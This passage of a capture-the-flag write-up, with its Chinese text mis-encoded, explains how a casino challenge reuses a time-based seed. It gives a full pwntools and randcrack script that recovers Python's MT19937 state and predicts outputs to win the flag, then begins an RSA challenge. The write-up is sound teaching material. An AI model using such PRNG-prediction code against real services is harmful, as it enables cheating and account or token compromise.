            <span class="pl-k">if</span> (<span class="pl-s1">card</span> <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFF</span>) <span class="pl-c1">==</span> <span class="pl-en">int</span>(<span class="pl-en">input</span>(<span class="pl-s">"check&gt;"</span>)):
                <span class="pl-s1">casino</span>.<span class="pl-c1">score</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>								<span class="pl-c"># çŒœå¯¹äº†åŠ ä¸€åˆ†</span>
                <span class="pl-en">print</span>(<span class="pl-s">"Positive"</span>)
            <span class="pl-k">else</span>:
                <span class="pl-s1">casino</span>.<span class="pl-c1">score</span> <span class="pl-c1">-=</span> <span class="pl-c1">2</span>								<span class="pl-c"># çŒœé”™äº†æ‰£ä¸¤åˆ†</span>
                <span class="pl-en">print</span>(<span class="pl-s">"Negative"</span>)
                <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">card</span> <span class="pl-c1">=</span> <span class="pl-kos">}</span></span>"</span>)								<span class="pl-c"># å¹¶ä¸”ä¼šå‘ŠçŸ¥æ­£ç¡®çš„æ•°æ˜¯ä»€ä¹ˆ</span>

        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"s"</span>:										<span class="pl-c"># åœ¨å¾—åˆ† â‰¥ 9999 æ—¶æŒ‰ä¸‹ s é”®è·å¾— Flag</span>
            <span class="pl-k">assert</span> <span class="pl-s1">casino</span>.<span class="pl-c1">score</span> <span class="pl-c1">&gt;=</span> <span class="pl-c1">9999</span>
            <span class="pl-s1">utils</span>.<span class="pl-c1">solve</span>()
            <span class="pl-k">raise</span> <span class="pl-v">Exception</span>

        <span class="pl-k">assert</span> <span class="pl-s1">casino</span>.<span class="pl-c1">score</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">0</span>									<span class="pl-c"># åˆ†æ•°å½’é›¶æ—¶é€€å‡ºæ¸¸æˆ</span>
    <span class="pl-k">except</span>:
        <span class="pl-k">break</span></pre></div>
<p>ç›®å‰æŒæ¡çš„ä¿¡æ¯ä¸å¤Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å¦ä¸€ä¸ªä¸‹å‘çš„æ–‡ä»¶ä¸­è·å–æ›´å¤šä¿¡æ¯ï¼š</p>
<p><code class="notranslate">utils.py</code> ï¼ˆèŠ‚é€‰ï¼‰</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">class</span> <span class="pl-c1">CASINO</span>:
    <span class="pl-k">def</span> <span class="pl-en">__init__</span>(<span class="pl-s1">self</span>):											<span class="pl-c"># åˆå§‹åŒ–</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">urandom</span>(<span class="pl-c1">16</span>)								<span class="pl-c"># ç”Ÿæˆä¸€ä¸ªå¯†é’¥ key</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">rng</span> <span class="pl-c1">=</span> <span class="pl-s1">random</span>.<span class="pl-c1">Random</span>()								<span class="pl-c"># åˆ›å»ºä¸€ä¸ªéšæœºæ•°ç”Ÿæˆå™¨</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">refresh</span>()											<span class="pl-c"># è¿›è¡Œä¸€æ¬¡åˆ·æ–°æ“ä½œ</span>

    <span class="pl-k">def</span> <span class="pl-en">refresh</span>(<span class="pl-s1">self</span>):											<span class="pl-c"># åˆ·æ–°æ“ä½œ</span>
        <span class="pl-s1">seed</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-en">pow</span>(<span class="pl-s1">time</span>.<span class="pl-c1">time</span>(), <span class="pl-c1">0.93</span>))						<span class="pl-c"># åŸºäºå½“å‰æ—¶é—´çš„ç§å­ seedï¼ˆä¸€ä¸ªä¼ç¬”ï¼‰</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">rng</span>.<span class="pl-c1">seed</span>(<span class="pl-en">bytes_to_long</span>(<span class="pl-s1">self</span>.<span class="pl-c1">key</span>) <span class="pl-c1">+</span> <span class="pl-s1">seed</span>)			<span class="pl-c"># éšæœºæ•°ç”Ÿæˆå™¨åŸºäº key + seed ç”Ÿæˆæ–°çš„ç”Ÿæˆå™¨ç§å­</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">score</span> <span class="pl-c1">=</span> <span class="pl-c1">0x4c4</span>										<span class="pl-c"># åˆå§‹åˆ†æ•°ä¸º 610 * 2 åˆ†</span>
    
    <span class="pl-k">def</span> <span class="pl-en">card</span>(<span class="pl-s1">self</span>):												<span class="pl-c"># å‘ç‰Œæ“ä½œ</span>
        <span class="pl-k">return</span> <span class="pl-s1">self</span>.<span class="pl-c1">rng</span>.<span class="pl-c1">getrandbits</span>(<span class="pl-c1">32</span>)							<span class="pl-c"># åˆ©ç”¨éšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆä¸€ä¸ª 32 ä½éšæœºæ•°</span></pre></div>
<p><code class="notranslate">random.Random()</code> è¯´æ˜ç¨‹åºä½¿ç”¨äº† Python è‡ªå¸¦äº†çš„éšæœºæ•°è®¡ç®—ï¼šä¼ªéšæœºæ•°ç”Ÿæˆå™¨ mt19937ã€‚</p>
<p>è¿™ä¸ªéšæœºæ•°ç®—æ³•å¯¹äºç›¸åŒçš„ç§å­æ€»ä¼šç»™å‡ºç›¸åŒçš„è¾“å‡ºç»“æœï¼Œä¸”ç®—æ³•ä¸Šå¯ä»¥é€†å‘å®ç°éšæœºæ•°é¢„æµ‹ï¼Œå‰ææ˜¯å…ˆè¦è·å–<strong>è¿ç»­çš„ 624 ä¸ª 32 ä½</strong>çš„å·²ç”Ÿæˆçš„éšæœºæ•°ï¼ˆè¿™ä¹ˆå¤šçš„æ•°æ®è¶³å¤Ÿæ‰¾åˆ°å¾ªç¯ç‚¹ï¼‰ï¼Œè¿™é‡Œè€ƒè™‘ä½¿ç”¨ <code class="notranslate">randcrack</code> åº“</p>
<p>ç„¶è€Œï¼Œåˆå§‹åˆ†æ•° <code class="notranslate">610 * 2</code> ï¼Œä½†æ˜¯ 624 æ¬¡é”™è¯¯çš„çŒœæ•°ä¼šæ‰£é™¤ <code class="notranslate">624 * 2</code> çš„åˆ†æ•°ï¼Œæ‰€ä»¥æˆ‘æ²¡æœ‰åŠæ³•è¿ç»­çŒœé”™ 624 æ¬¡ï¼Œå¿…é¡»è¦çŒœå¯¹è‹¥å¹²æ¬¡</p>
<p>åœ¨è§‚å¯Ÿäº†å››é“ Crypto é¢˜ç›®çš„æ¡†æ¶åï¼Œæˆ‘å‘ç°åªæœ‰ç¬¬å››é¢˜æä¾›äº†é‡ç½®æ“ä½œ <code class="notranslate">r</code>ã€‚ä¸ºä»€ä¹ˆè¦æä¾›ä¸€ä¸ª <code class="notranslate">r</code> é”®é‡ç½®ï¼Ÿè™½ç„¶ <code class="notranslate">r</code> é”®å¯ä»¥é‡ç½®å¾—åˆ†ï¼Œä½†æ˜¯ä¹Ÿä¼šé‡ç½® <code class="notranslate">self.rng.seed</code>ï¼Œä¹Ÿå°±æ˜¯éšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­ï¼Œçœ‹ä¸Šå» <code class="notranslate">r</code> æ“ä½œæ²¡æœ‰ä½œç”¨</p>
<blockquote>
<p>é™¤é <code class="notranslate">r</code> æ“ä½œå¹¶ä¸æ˜¯ä¸€å®šä¼šé‡ç½®éšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­ï¼Ÿ</p>
</blockquote>
<p>ä»”ç»†çœ‹ä¸€ä¸‹éšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­æ˜¯å¦‚ä½•è¢«è®¡ç®—çš„ï¼š</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-s1">seed</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-en">pow</span>(<span class="pl-s1">time</span>.<span class="pl-c1">time</span>(), <span class="pl-c1">0.93</span>))				<span class="pl-c"># (int)(æ—¶é—´æˆ³ ^ 0.93)</span>
<span class="pl-s1">self</span>.<span class="pl-c1">rng</span>.<span class="pl-c1">seed</span>(<span class="pl-en">bytes_to_long</span>(<span class="pl-s1">self</span>.<span class="pl-c1">key</span>) <span class="pl-c1">+</span> <span class="pl-s1">seed</span>)	<span class="pl-c"># key + seedï¼Œå…¶ä¸­ key ä¸ä¼šéšç€ r æ“ä½œæ”¹å˜ï¼Œæ”¹å˜ seed</span></pre></div>
<p>å¯¹äº <code class="notranslate">(int)(æ—¶é—´æˆ³ ^ 0.93)</code> è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œå½“ä¸¤ä¸ªæ—¶é—´æˆ³éå¸¸æ¥è¿‘æ—¶ï¼Œè®¡ç®—å¾—åˆ°çš„ç§å­æ˜¯å®Œå…¨ç›¸åŒçš„</p>
<blockquote>
<p>æ¯”å¦‚æˆ‘ç°åœ¨æŸ¥è¯¢æ—¶é—´æˆ³å¾—åˆ°çš„æ•°å€¼æ˜¯ <code class="notranslate">1759734250</code>ï¼Œä¸éš¾è®¡ç®—</p>
<p><code class="notranslate">(int)1759734250^0.93 == (int)1759734252^0.93 == 396520633</code>ï¼Œå¾—åˆ°äº† 3s çš„çª—å£æœŸ</p>
<p>å¦‚æœåˆ·æ–°çš„æ—¶é—´æ°å½“ï¼Œ<strong>æœ€å¤§å¯ä»¥äº‰å–çº¦ 5s çš„çª—å£æœŸ</strong>ï¼Œè¿™æ®µæ—¶é—´å†…çš„ <code class="notranslate">r</code> åˆ·æ–°æ“ä½œä¸ä¼šæ”¹å˜ <code class="notranslate">seed</code> å€¼</p>
</blockquote>
<p>äºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªè‡ªåŠ¨åŒ–æ–¹æ¡ˆï¼š</p>
<ol>
<li>è§£å†³ PoW é—®é¢˜ï¼ˆå†™ä¸€æ®µæš´åŠ›è®¡ç®—çš„ç¨‹åºå³å¯ï¼‰</li>
<li>å…ˆç­”é”™è·å–å‰åä¸ªéšæœºæ•°ï¼Œä¿å­˜ï¼ˆè¿™é‡Œçš„åæ¬¡å®é™…ä¸Šå¯ä»¥æ›´å°‘ä¸€äº›ï¼Œè¿™å–å†³äºç½‘é€Ÿï¼‰</li>
<li><code class="notranslate">r</code> åˆ·æ–°ä¸€æ¬¡</li>
<li>ç”¨ä¹‹å‰è·å–çš„å‰åä¸ªéšæœºæ•°å»å›ç­”å‰åæ¬¡çŒœæ•°é—®é¢˜ï¼ˆä¸ä¼šæ‰£åˆ†ï¼Œè€Œä¸”ä¼šåŠ åˆ†ï¼‰</li>
<li>ç»§ç»­çŒœé”™ç›´åˆ°è·å–äº† 624 ä¸ªéšæœºæ•°ï¼ˆå¯ä»¥ä¿è¯åˆ†æ•°ä¸ä¼šå‡åˆ° 0 ä»¥ä¸‹ï¼‰</li>
<li>ç°åœ¨ mt19937 çš„éšæœºæ•°å¯ä»¥å®Œå…¨é¢„æµ‹äº†ï¼ŒæŒç»­çŒœå¯¹æ•°å­—ç›´åˆ°åˆ†æ•°è¶…è¿‡ 9999</li>
<li><code class="notranslate">s</code> è·å– Flagï¼</li>
</ol>
<p>ç”¨ AI è¾…åŠ©å†™äº†ä¸€æ®µè‡ªåŠ¨åŒ–çš„ Python ç¨‹åºï¼ˆ<del>æˆ‘ä¸ä¼š Python</del>ï¼‰</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">hashlib</span>
<span class="pl-k">import</span> <span class="pl-s1">string</span>
<span class="pl-k">import</span> <span class="pl-s1">itertools</span>
<span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span>
<span class="pl-k">from</span> <span class="pl-s1">randcrack</span> <span class="pl-k">import</span> <span class="pl-v">RandCrack</span>

<span class="pl-k">def</span> <span class="pl-en">solve_pow</span>(<span class="pl-s1">prefix</span>, <span class="pl-s1">target_hash</span>, <span class="pl-s1">length</span><span class="pl-c1">=</span><span class="pl-c1">4</span>):
    <span class="pl-c"># çˆ†ç ´ XXXX</span>
    <span class="pl-k">for</span> <span class="pl-s1">comb</span> <span class="pl-c1">in</span> <span class="pl-s1">itertools</span>.<span class="pl-c1">product</span>(<span class="pl-s1">string</span>.<span class="pl-c1">ascii_letters</span> <span class="pl-c1">+</span> <span class="pl-s1">string</span>.<span class="pl-c1">digits</span>, <span class="pl-s1">repeat</span><span class="pl-c1">=</span><span class="pl-s1">length</span>):
        <span class="pl-s1">attempt</span> <span class="pl-c1">=</span> <span class="pl-s">''</span>.<span class="pl-c1">join</span>(<span class="pl-s1">comb</span>)
        <span class="pl-s1">h</span> <span class="pl-c1">=</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">sha256</span>((<span class="pl-s1">attempt</span> <span class="pl-c1">+</span> <span class="pl-s1">prefix</span>).<span class="pl-c1">encode</span>()).<span class="pl-c1">hexdigest</span>()
        <span class="pl-k">if</span> <span class="pl-s1">h</span> <span class="pl-c1">==</span> <span class="pl-s1">target_hash</span>:
            <span class="pl-k">return</span> <span class="pl-s1">attempt</span>
    <span class="pl-k">return</span> <span class="pl-c1">None</span>

<span class="pl-k">def</span> <span class="pl-en">main</span>():
    <span class="pl-c"># è¿æ¥ä¿¡æ¯ï¼š</span>
    <span class="pl-c"># xxx.xxx.xxx.xx:xxxxx</span>
    <span class="pl-s1">host</span> <span class="pl-c1">=</span> <span class="pl-s">'123.456.789.01'</span>
    <span class="pl-s1">port</span> <span class="pl-c1">=</span> <span class="pl-c1">12345</span>

    <span class="pl-c"># ç¬¬ä¸€æ­¥ï¼šæ¥æ”¶ PoW é¢˜ç›®</span>
    <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s1">host</span>, <span class="pl-s1">port</span>)
    <span class="pl-s1">line</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvuntil</span>(<span class="pl-s">b'= '</span>).<span class="pl-c1">decode</span>()
    <span class="pl-s1">target_hash</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>().<span class="pl-c1">strip</span>().<span class="pl-c1">decode</span>()
    <span class="pl-s1">prefix</span> <span class="pl-c1">=</span> <span class="pl-s1">line</span>.<span class="pl-c1">split</span>(<span class="pl-s">'+'</span>)[<span class="pl-c1">1</span>].<span class="pl-c1">split</span>(<span class="pl-s">')'</span>)[<span class="pl-c1">0</span>]  <span class="pl-c"># æå– iMwfwaWvfBil7B9S è¿™æ ·çš„åç¼€</span>
    <span class="pl-en">print</span>(<span class="pl-s">f"PoW: sha256(XXXX+<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">prefix</span><span class="pl-kos">}</span></span>) = <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">target_hash</span><span class="pl-kos">}</span></span>"</span>)

    <span class="pl-c"># çˆ†ç ´ PoW</span>
    <span class="pl-s1">pow_sol</span> <span class="pl-c1">=</span> <span class="pl-en">solve_pow</span>(<span class="pl-s1">prefix</span>, <span class="pl-s1">target_hash</span>)
    <span class="pl-k">if</span> <span class="pl-s1">pow_sol</span> <span class="pl-c1">is</span> <span class="pl-c1">None</span>:
        <span class="pl-en">print</span>(<span class="pl-s">"PoW failed"</span>)
        <span class="pl-k">return</span>
    <span class="pl-en">print</span>(<span class="pl-s">f"PoW solution: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pow_sol</span><span class="pl-kos">}</span></span>"</span>)
    <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s1">pow_sol</span>.<span class="pl-c1">encode</span>())

    <span class="pl-c"># è¿›å…¥ä¸»å¾ªç¯</span>
    <span class="pl-s1">rc</span> <span class="pl-c1">=</span> <span class="pl-en">RandCrack</span>()

    <span class="pl-c"># ç¬¬ä¸€é˜¶æ®µï¼šæ”¶é›†å‰10ä¸ªéšæœºæ•°</span>
    <span class="pl-s1">first_10_cards</span> <span class="pl-c1">=</span> []
    <span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">10</span>):
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'H'</span>)
        <span class="pl-c"># çŒœé”™ï¼ˆè¾“å…¥ 0 ï¼‰</span>
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'check&gt;'</span>, <span class="pl-s">b'0'</span>)
        <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
        <span class="pl-k">if</span> <span class="pl-s">b'Negative'</span> <span class="pl-c1">in</span> <span class="pl-s1">resp</span>:
            <span class="pl-s1">line</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
            <span class="pl-c"># è§£æ card = 12345678</span>
            <span class="pl-s1">card_val</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-s1">line</span>.<span class="pl-c1">decode</span>().<span class="pl-c1">split</span>(<span class="pl-s">'='</span>)[<span class="pl-c1">1</span>].<span class="pl-c1">strip</span>())
            <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>] card = <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">card_val</span><span class="pl-kos">}</span></span>"</span>)
            <span class="pl-s1">first_10_cards</span>.<span class="pl-c1">append</span>(<span class="pl-s1">card_val</span>)
        <span class="pl-k">else</span>:
            <span class="pl-c"># å‰åæ¬¡éƒ½æœ‰çŒœå¯¹çš„ï¼Œä½ åº”è¯¥å»ä¹°å½©ç¥¨ï¼Œä½ ä¸å‡†åšé¢˜äº†</span>
            <span class="pl-k">return</span>

    <span class="pl-c"># r é‡ç½®</span>
    <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'R'</span>)

    <span class="pl-c"># ç¬¬äºŒé˜¶æ®µï¼šé‡æ–°æ”¶é›†624ä¸ªéšæœºæ•°ï¼Œå‰10æ¬¡ç”¨å·²çŸ¥çš„æ­£ç¡®å€¼çŒœæµ‹</span>
    <span class="pl-s1">score</span> <span class="pl-c1">=</span> <span class="pl-c1">610</span> <span class="pl-c1">*</span> <span class="pl-c1">2</span>  <span class="pl-c"># åˆå§‹åˆ†æ•°</span>
    
    <span class="pl-c"># å‰10æ¬¡ä½¿ç”¨å·²çŸ¥çš„æ­£ç¡®å€¼</span>
    <span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">10</span>):
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'H'</span>)
        <span class="pl-c"># ä½¿ç”¨ä¹‹å‰æ”¶é›†åˆ°çš„æ­£ç¡®ä½16ä½</span>
        <span class="pl-s1">correct_low16</span> <span class="pl-c1">=</span> <span class="pl-s1">first_10_cards</span>[<span class="pl-s1">i</span>] <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFF</span>
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'check&gt;'</span>, <span class="pl-en">str</span>(<span class="pl-s1">correct_low16</span>).<span class="pl-c1">encode</span>())
        <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
        <span class="pl-k">if</span> <span class="pl-s">b'Positive'</span> <span class="pl-c1">in</span> <span class="pl-s1">resp</span>:
            <span class="pl-s1">score</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
            <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>] Correct guess! Score: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">score</span><span class="pl-kos">}</span></span>"</span>)
            <span class="pl-c"># æäº¤ç»™ RandCrackï¼ˆ32 ä½ï¼‰</span>
            <span class="pl-s1">rc</span>.<span class="pl-c1">submit</span>(<span class="pl-s1">first_10_cards</span>[<span class="pl-s1">i</span>] <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFFFFFF</span>)
        <span class="pl-k">else</span>:
            <span class="pl-c"># ç½‘é€Ÿè¾ƒå·®/æ—¶é—´çª—å£æ²¡å¡å¥½</span>
            <span class="pl-s1">score</span> <span class="pl-c1">-=</span> <span class="pl-c1">2</span>
            <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>] Unexpected Negative!"</span>)
            <span class="pl-k">return</span>

    <span class="pl-c"># ç»§ç»­æ”¶é›†å‰©ä½™çš„614ä¸ªéšæœºæ•°</span>
    <span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">10</span>, <span class="pl-c1">624</span>):
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'H'</span>)
        <span class="pl-c"># çŒœé”™ï¼ˆè¾“å…¥ 0ï¼‰</span>
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'check&gt;'</span>, <span class="pl-s">b'0'</span>)
        <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
        <span class="pl-k">if</span> <span class="pl-s">b'Negative'</span> <span class="pl-c1">in</span> <span class="pl-s1">resp</span>:
            <span class="pl-s1">score</span> <span class="pl-c1">-=</span> <span class="pl-c1">2</span>
            <span class="pl-s1">line</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
            <span class="pl-c"># è§£æ card = xxxxxxxx</span>
            <span class="pl-s1">card_val</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-s1">line</span>.<span class="pl-c1">decode</span>().<span class="pl-c1">split</span>(<span class="pl-s">'='</span>)[<span class="pl-c1">1</span>].<span class="pl-c1">strip</span>())
            <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>] card = <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">card_val</span><span class="pl-kos">}</span></span>"</span>)
            <span class="pl-c"># æäº¤ç»™ RandCrackï¼ˆ32 ä½ï¼‰</span>
            <span class="pl-s1">rc</span>.<span class="pl-c1">submit</span>(<span class="pl-s1">card_val</span> <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFFFFFF</span>)
        <span class="pl-k">else</span>:
            <span class="pl-c"># ä½ çŸ¥é“æˆ‘è¦è¯´ä»€ä¹ˆ</span>
            <span class="pl-k">return</span>

    <span class="pl-c"># ç¬¬ä¸‰é˜¶æ®µï¼šå…¨éƒ¨çŒœå¯¹ç›´åˆ°åˆ†æ•°è¶³å¤Ÿ</span>
    <span class="pl-k">while</span> <span class="pl-s1">score</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">9999</span>:
        <span class="pl-c"># é¢„æµ‹ä¸‹ä¸€ä¸ªéšæœºæ•°</span>
        <span class="pl-s1">predicted</span> <span class="pl-c1">=</span> <span class="pl-s1">rc</span>.<span class="pl-c1">predict_getrandbits</span>(<span class="pl-c1">32</span>)
        <span class="pl-s1">low16</span> <span class="pl-c1">=</span> <span class="pl-s1">predicted</span> <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFF</span>

        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'H'</span>)
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'check&gt;'</span>, <span class="pl-en">str</span>(<span class="pl-s1">low16</span>).<span class="pl-c1">encode</span>())
        <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
        <span class="pl-k">if</span> <span class="pl-s">b'Positive'</span> <span class="pl-c1">in</span> <span class="pl-s1">resp</span>:
            <span class="pl-s1">score</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
            <span class="pl-en">print</span>(<span class="pl-s">f"Score: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">score</span><span class="pl-kos">}</span></span>"</span>)
        <span class="pl-k">else</span>:
            <span class="pl-s1">score</span> <span class="pl-c1">-=</span> <span class="pl-c1">2</span>
            <span class="pl-en">print</span>(<span class="pl-s">f"Wrong prediction! Score: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">score</span><span class="pl-kos">}</span></span>"</span>)
            <span class="pl-c"># åº”è¯¥ä¸ä¼šå‡ºé”™</span>
            <span class="pl-k">if</span> <span class="pl-s1">score</span> <span class="pl-c1">&lt;=</span> <span class="pl-c1">0</span>:
                <span class="pl-en">print</span>(<span class="pl-s">"Score &lt;= 0, failed"</span>)
                <span class="pl-k">return</span>

    <span class="pl-c"># åˆ†æ•°è¾¾åˆ° 9999ï¼ŒStand</span>
    <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'S'</span>)
    <span class="pl-v">Flag</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
    <span class="pl-en">print</span>(<span class="pl-v">Flag</span>)
    <span class="pl-s1">r</span>.<span class="pl-c1">close</span>()

<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">'__main__'</span>:
    <span class="pl-en">main</span>()</pre></div>
<p>è·‘ä¸€éç¨‹åºå³å¯æ‹¿åˆ° Flag: <code class="notranslate">flag{303191d0-227d-440d-8cf6-7a45f378757e}</code></p>
<p>ï¼ˆä¸ªäººå»ºè®®æŠŠ 600s æ—¶é™æ”¾å®½ä¸€ç‚¹ï¼Œæˆ‘ä¸€å¼€å§‹è¿æ¥çš„æ ¡å†… VPN åœ¨å¾—åˆ°ä¸¤åƒå¤šåˆ†çš„æ—¶å€™å°±è¶…æ—¶é€€å‡ºäº†ğŸ˜¡ï¼‰</p>
<h3>Crypto05-EZRSA</h3>
<p>æä¾›äº†ä¸€ä¸ª Python æ–‡ä»¶ï¼Œ<del>ç¿»ä»£ç å‘ç° flag = b"flag{GUESS_ME_DUDE???}"ï¼Œç»“æŸæœ¬é¢˜</del></p>
<p>æœ«å°¾æ³¨é‡Šæä¾›äº†ä¸€äº› RSA ç›¸å…³çš„æ•°æ®ï¼š</p>
<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-s1">n</span> <span class="pl-c1">=</span> <span class="pl-c1">1761136274297027039963230651989531722606611852591964400481006338727378865369012452786479495394114231817718239</span>
<span class="pl-s1">e</span> <span class="pl-c1">=</span> <span class="pl-c1">65537</span>
<span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-c1">1230891216923086590416832066481981391436300928059089913296665775664238914246508186217218568669712406212992089</span></pre></div>
<p>æˆ‘ä»¬éœ€è¦æ‹†è§£ <code class="notranslate">n</code> è¿™ä¸ªå¤§æ•°ï¼ˆ<code class="notranslate">n = p * q</code>ï¼‰ï¼Œè€Œä¸å¹¸çš„æ˜¯ factordb æ‹†ä¸å¼€è¿™ä¸ªæ•°ï¼Œæ³¨æ„åˆ°æä¾›çš„ä»£ç ä¸­æœ‰è¿™æ ·çš„ç”Ÿæˆæ“ä½œ</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-s1">p_bits</span> <span class="pl-c1">=</span> <span class="pl-c1">180</span>  										<span class="pl-c"># p æ˜¯ 180 ä½çš„æ•°å­—</span>
<span class="pl-s1">close_offset_max</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span> <span class="pl-c1">&lt;&lt;</span> <span class="pl-c1">20</span>

<span class="pl-s1">low</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span> <span class="pl-c1">&lt;&lt;</span> (<span class="pl-s1">p_bits</span> <span class="pl-c1">-</span> <span class="pl-c1">1</span>)
<span class="pl-s1">high</span> <span class="pl-c1">=</span> (<span class="pl-c1">1</span> <span class="pl-c1">&lt;&lt;</span> <span class="pl-s1">p_bits</span>) <span class="pl-c1">-</span> <span class="pl-c1">1</span>

<span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-s1">random</span>.<span class="pl-c1">randrange</span>(<span class="pl-s1">low</span>, <span class="pl-s1">high</span>)						
<span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">next_prime</span>(<span class="pl-s1">a</span>)									<span class="pl-c"># ç”Ÿæˆ 180 ä½çš„éšæœºç´ æ•° p</span>
